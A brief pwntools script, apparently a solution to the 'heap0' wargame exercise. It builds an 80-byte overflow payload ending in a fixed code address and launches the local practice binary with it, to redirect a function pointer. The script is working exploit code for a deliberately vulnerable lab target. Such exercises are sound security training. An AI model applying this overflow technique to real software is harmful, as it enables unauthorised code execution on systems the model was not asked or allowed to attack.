from pwn import *

dist = 80
payload =  cyclic(80) + p32(0x08048464)

p = process(['./heap0', payload])